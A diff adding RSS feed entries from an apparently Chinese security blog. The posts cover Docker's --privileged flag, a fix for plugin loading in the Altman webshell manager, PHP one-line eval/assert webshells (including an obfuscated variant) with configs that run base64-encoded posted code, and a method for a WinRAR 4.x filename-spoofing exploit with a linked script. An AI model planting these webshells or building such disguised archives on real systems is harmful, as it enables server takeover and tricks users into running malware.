+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;test@testpc$ docker &lt;span class=&#34;nb&#34;&gt;help&lt;/span&gt; run 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;--privileged&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;false&lt;/span&gt;  Give extended privileges to this container
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;em&gt;docker容器内的root，默认情况下只是外部的一个普通用户权限，并不拥有root权限。只有使用了该参数，容器内的root才拥有真正的root权限。&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;尝试一下：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;使用&lt;code&gt;privileged&lt;/code&gt;创建一个新的容器：
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;test@testpc$ docker run --privileged --name &lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt; -t -i ubuntu:14.04 /bin/bash
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;进入容器，运行&lt;code&gt;iscsiadm&lt;/code&gt;：
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;root@aaaa# iscsiadm -m discovery -t st -p 192.168.1.10
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;192.168.1.10:3260,1 iqn.1997-05.com.test:iscsi1
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;完美解决！END&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Altman不能成功的加载插件</title>
+        <link>/posts/run-app-based-on-mef-from-web/</link>
+        <pubDate>Mon, 28 Jul 2014 00:00:00 +0000</pubDate>
+        
+        <guid>/posts/run-app-based-on-mef-from-web/</guid>
+        <description>&lt;p&gt;一直有小伙伴给我反馈说：在.Net环境安装好的情况下，Altman不能自动载入插件。&lt;/p&gt;
+&lt;p&gt;而我在测试的时候，确实发生过相似的现象，但却找不到问题所在。&lt;/p&gt;
+&lt;p&gt;今天早些时候，在stackoverflow看到之前有人提到过&lt;a class=&#34;link&#34; href=&#34;http://stackoverflow.com/questions/5412086/mef-based-app-works-great-on-local-machine-but-doesnt-import-addins-when-run-f&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;类似的问题&lt;/a&gt;，恍然大悟。&lt;/p&gt;
+&lt;p&gt;原来，当我们从Web下载Altman程序的时候，程序集将会被添加一个新的安全属性（文件来自网络，已被锁定）。运行altman，由于loadFromRemoteSources默认属性是false，程序就无法加载这些插件dll。(在&lt;a class=&#34;link&#34; href=&#34;http://msdn.microsoft.com/en-us/library/dd409252%28VS.100%29.aspx&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;这里&lt;/a&gt;有详细的说明)&lt;/p&gt;
+&lt;p&gt;所以，解决这个问题目前有三种方法：&lt;/p&gt;
+&lt;!-- more --&gt;
+&lt;ul&gt;
+&lt;li&gt;手动修改Plugins目录下插件的文件属性。&lt;/li&gt;
+&lt;li&gt;在程序根目录下添加Altman.exe.config，内容如下:
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;configuration&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;runtime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;loadFromRemoteSources&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;enabled&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;runtime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;configuration&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;主程序将在下一个版本2.2.1中解决该问题。&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        </item>
+        <item>
+        <title>Altman连接phpEval与phpAssert一句话木马</title>
+        <link>/posts/altman-connects-phpeval-and-phpassert-shell/</link>
+        <pubDate>Thu, 10 Jul 2014 00:00:00 +0000</pubDate>
+        
+        <guid>/posts/altman-connects-phpeval-and-phpassert-shell/</guid>
+        <description>&lt;p&gt;之前测试altman工具的时候，遇到了一个问题，现解决方法如下：&lt;/p&gt;
+&lt;p&gt;Altman连接phpEval一句话木马的时候，phpEval.type的定义如下：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;customShellType&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &amp;lt;basicSetting&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;name&amp;gt;phpEval&amp;lt;/name&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;serviceExample&amp;gt;&amp;lt;![CDATA[&amp;lt;?php @eval($_POST[a])?&amp;gt;]]&amp;gt;&amp;lt;/serviceExample&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;mainCodeParam location=&amp;#34;Body&amp;#34; encrymode=&amp;#34;None&amp;#34; &amp;gt;passwd&amp;lt;/mainCodeParam&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &amp;lt;/basicSetting&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &amp;lt;mainCodeSetting&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;funcCodeParam location=&amp;#34;Body&amp;#34; encrymode=&amp;#34;Base64&amp;#34; &amp;gt;funcCode&amp;lt;/funcCodeParam&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;item&amp;gt;&amp;lt;![CDATA[print(&amp;#34;-&amp;gt;|&amp;#34;);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;eval(base64_decode($_POST[$funcCode$]));
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;print(&amp;#34;|&amp;lt;-&amp;#34;);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;die();]]&amp;gt;&amp;lt;/item&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &amp;lt;/mainCodeSetting&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;/customShellType&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;!-- more --&gt;
+&lt;p&gt;eval函数执行php语句&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;print(&amp;quot;-&amp;gt;|&amp;quot;);eval(base64_decode($_POST[$funcCode$]));print(&amp;quot;|&amp;lt;-&amp;quot;);die();&lt;/code&gt;时，&lt;/p&gt;
+&lt;p&gt;确实是正确的。&lt;/p&gt;
+&lt;p&gt;然而当使用某些变形php一句话木马，如：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;&amp;lt;?php $a = &amp;quot;a&amp;quot;.&amp;quot;s&amp;quot;.&amp;quot;s&amp;quot;.&amp;quot;e&amp;quot;.&amp;quot;r&amp;quot;.&amp;quot;t&amp;quot;;  $a($_POST[&amp;quot;a&amp;quot;]); ?&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;时，&lt;/p&gt;
+&lt;p&gt;Altman就无法连接一句话木马了。&lt;/p&gt;
+&lt;p&gt;原因在于，这个变形木马使用的是assert函数，而eval与assert最主要区别是eval的参数可以是多个语句，而assert的参数是一个表达式。所以assert只会执行到print(&amp;quot;-&amp;gt;|&amp;quot;)代码，后面的代码则直接报错了。&lt;/p&gt;
+&lt;p&gt;所以在了解到eval与assert的区别后，很容易写出一个新脚本类型，phpAssert.type定义如下：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;customShellType&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &amp;lt;basicSetting&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;name&amp;gt;phpAssert&amp;lt;/name&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;serviceExample&amp;gt;&amp;lt;![CDATA[&amp;lt;?php @assert($_POST[a])?&amp;gt;]]&amp;gt;&amp;lt;/serviceExample&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&amp;lt;mainCodeParam location=&amp;#34;Body&amp;#34; encrymode=&amp;#34;None&amp;#34; &amp;gt;passwd&amp;lt;/mainCodeParam&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &amp;lt;/basicSetting&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &amp;lt;mainCodeSetting&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&amp;lt;funcCodeParam location=&amp;#34;Body&amp;#34; encrymode=&amp;#34;Base64&amp;#34; &amp;gt;funcCode&amp;lt;/funcCodeParam&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&amp;lt;item&amp;gt;&amp;lt;![CDATA[@eval(&amp;#34;print(&amp;#39;-&amp;gt;|&amp;#39;);&amp;#34;.base64_decode($_POST[$funcCode$]).&amp;#34;print(&amp;#39;|&amp;lt;-&amp;#39;);&amp;#34;);]]&amp;gt;&amp;lt;/item&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &amp;lt;/mainCodeSetting&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;/customShellType&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;PS:其实assert还有一个坑，那就是echo在assert中是不能直接使用的，因为在php中echo并不是一个函数:)，不能作为表达式。&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Winrar4.x的文件欺骗漏洞利用脚本</title>
+        <link>/posts/file-spoofing-vulnerability-winrar4-x-scripting/</link>
+        <pubDate>Mon, 31 Mar 2014 00:00:00 +0000</pubDate>
+        
+        <guid>/posts/file-spoofing-vulnerability-winrar4-x-scripting/</guid>
+        <description>&lt;h2 id=&#34;000-背景&#34;&gt;0×00 背景
+&lt;/h2&gt;&lt;p&gt;这几天仔细研究了winrar4.x系列的文件扩展名欺骗漏洞的那篇文章，通过一些测试对其有了一些新的想法和建议。（准确的说应该不能算文件扩展名欺骗漏，不止扩展名，整个文件名都是可以欺骗的）&lt;/p&gt;
+&lt;p&gt;具体的漏洞成因相信文章中都很清楚了，简单说一下：&lt;/p&gt;
+&lt;p&gt;zip格式中有2个filename，一般情况下，一般应用程序打开zip时，预览使用的是filename2，点击预览也是以filename2方式打开的，只有在解压的时候才会使用filename1。然而在winrar4.x中，点击预览是以预览filename1方式打开的。&lt;/p&gt;
+&lt;p&gt;这会造成什么结果呢？当第一个filename为readme.exe，第二个filename为readme.txt时，用winrar4.x打开时，你在程序窗口看到的文件名为readme.txt，然后你再点击文件时却是以readme.exe方式打开，这就形成漏洞了。&lt;/p&gt;
+&lt;p&gt;文章给出了如何利用这个bug的方法，更改filename2即可。但是作者是手动操作的，那么能不能写成利用脚本呢？这个filename2的长度有没有要求，需不需要和filename1长度相同？这正是本文要研究的。&lt;/p&gt;
+&lt;!-- more --&gt;
+&lt;h2 id=&#34;001-细节&#34;&gt;0×01 细节
+&lt;/h2&gt;&lt;p&gt;在研究这个问题以前，先科普一下zip格式（想看详细版的去网上下载APPNOTE.TXT）。&lt;/p&gt;
+&lt;p&gt;zip格式由3部分组成：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;1. 文件内容源数据
+2. 目录源数据
+3. 目录结束标识结构
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;以只压缩了一个文件的zip文件为例，大致格式为：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;[file header]
+[file data]
+[data descriptor]
+[central directory file header]
+[end of central directory record]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;其中关键的几个字段为：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;[file header]:
+Offset        Bytes            Description
+18             4               Compressed size
+26             2               File name length (n)
+28             2               Extra field length (m)
+30             n               File name
+30+n           m               Extra field
+[central directory file header]:
+Offset       Bytes             Description
+28             2               File name length (n)
+30             2               Extra field length (m)
+34             2               File comment length (k)
+[end of central directory record]:
+Offset       Bytes             Description
+12             4               Size of central directory (bytes)
+16             4               Offset of start of central directory, relative to start of archive
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;在了解了zip基本格式后，我对winrar压缩生成的zip文件和用windows生成的zip文件进行了分析，它们的区别是winrar的zip文件在Extra field区段都进行了一些数据填充。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/img-20241015173502.webp&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;winrar压缩生成的zip文件和用windows生成的zip文件Hex对比&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;由于不清楚Extra field这部分的值会不会影响到winrar的校验，所以根据不同情况做了几个测试，当filename2长度改变时，并且对受filename2长度影响的所有字段（除Extra field）进行修改后，文件可以正常打开。测试结果证明Extra field的值并不会影响winrar打开zip文件。&lt;/p&gt;
+&lt;p&gt;这样一来，只要按照zip的格式，更改和filename2有关的所有字段，就可以写出一个利用脚本了。&lt;/p&gt;
+&lt;p&gt;等等，该文章中同时提到了，这个漏洞存在有一个限制：解压。如果你是以右键解压打开这个压缩包的话，那么只会使用filename1，和filename2无关，也就不存在这个漏洞了。作者在文章最后提到了可以利用LRO解决这个限制，那应该如何结合利用RLO呢？&lt;/p&gt;
+&lt;p&gt;用WinHex对正常zip文件、使用了字符反转的zip文件进行分析：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/img-20241015173502-1.webp&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;正常zip文件、使用了字符反转的zip文件对比&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;通过对比分析可以看到，当使用含有RLO文件名的文件进行压缩时，压缩的格式有点区别，继续做了几个测试，发现winrar在Extra field添加的信息，不会影响到漏洞的利用。&lt;/p&gt;
+&lt;p&gt;据此可以将这两个漏洞完美的结合在一起，写成一个利用脚本。&lt;/p&gt;
+&lt;p&gt;以python为例，具体思路为：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;1．生成一个带LRO的文件名的文件，并用winrar压缩为zip。在python中可以使用u&#39;\u202e&#39;来构造字符串反转，用os.system()函数来执行winrar命令。
+2．处理zip文件中的数据，将filename2更改为自己需要定义的字符串。按照zip格式依次读取，修改filename2为新的字符串，计算出新的长度，并且修改File name length2字段，Sizeofcentraldirectory 和Offsetofstartofcentraldirectory字段，处理好它们新的偏移位置。
+3．重新生成新的zip。
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;在文章最后附上完整的利用脚本WinrarExp.py&lt;/p&gt;
+&lt;p&gt;使用方法：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;WinrarExp.py [-f &amp;lt;open file&amp;gt;][-s &amp;lt;forged name&amp;gt;][-v &amp;lt;reversed string&amp;gt;]&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;-f表示要压缩的文件，比如1.exe
+-s表示要伪装的文件名，比如readme.txt
+-v表示需要反转的字符串，该参数为选用。比如想要文件名反转变成readmeEXE.jpg则参数只要设置为EXE.jpg
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;下载地址为：http://www.keepwn.com/files/WinrarExp.py&lt;/p&gt;
+</description>
+        </item>
+        
+    </channel>
+</rss>
